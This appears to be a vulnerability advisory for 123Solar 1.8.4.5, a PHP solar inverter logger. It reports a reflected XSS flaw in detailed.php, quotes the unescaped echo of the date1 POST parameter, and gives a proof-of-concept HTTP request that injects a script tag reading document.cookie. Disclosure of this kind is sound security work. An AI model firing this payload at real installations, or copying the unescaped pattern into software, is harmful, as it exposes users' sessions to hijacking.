| Summary 123Solar is a lightweight set of PHP/JS files that makes a web logger to monitor your photovoltaic inverter(s). It just need a web server and PHP, no databases are even needed. The philosophy is: To keep it simple, fast, with a low foot print to run on cheap and low powered devices.  A reflected Cross Site Scripting (XSS) vulnerability exists in 123Solar 1.8.4.5 due to improper sanitization of the `$date1` parameter in `detailed.php`. Details In the provided code, the date1 parameter is passed through a POST request and directly concatenated into JavaScript code on the server-side without proper encoding or escaping. This allows an attacker to inject arbitrary JavaScript code.  ``` $date1 = $_POST['date1']; // ... echo "<input name='date1' id='datepickid' value='$date1' size=7 maxlength=10>";  ```  The use of $\_POST['date1'] directly in HTML without encoding makes it possible for an attacker to inject any JavaScript code, resulting in a reflected XSS vulnerability. POC ``` POST /detailed.php HTTP/1.1 Host: 192.168.0.10:1107 Content-Type: application/x-www-form-urlencoded User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.95 Safari/537.36 Accept-Encoding: gzip, deflate, br Accept-Language: zh-CN,zh;q=0.9 Connection: keep-alive Content-Length: 286  date1=01/01/1967'><script>alert(document.cookie)</script>&checkavgpower=on&checkPROD=on&checkPERF=on&checkIP1=on&checkIV1=on&checkIA1=on&checkPERF1=on&checkIP2=on&checkIV2=on&checkIA2=on&checkPERF2=on&checkG1P=on&checkG1V=on&checkG1A=on&checkFRQ=on&checkINVT=on&checkBOOT=on&checkEFF=on  ```  [image](https://private-user-images.githubusercontent.com/66168888/367491587-3a7c91d5-1752-4370-87e6-53269b490b88.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY2MTk0NTQsIm5iZiI6MTczNjYxOTE1NCwicGF0aCI6Ii82NjE2ODg4OC8zNjc0OTE1ODctM2E3YzkxZDUtMTc1Mi00MzcwLTg3ZTYtNTMyNjliNDkwYjg4LnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTAxMTElMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwMTExVDE4MTIzNFomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPTBlOTY0ZWMxM2I1NTNlYTNmOWVjODk3OGUyZDEyYzBiMzIxMWFjNTc5YjU2MmY5YzVmMDE4ZDBhODRiYjdmZmMmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.GNmJdkJhWBZmRpV29mx8WjntzOX5ymCd-mSLpVtFDD4) |
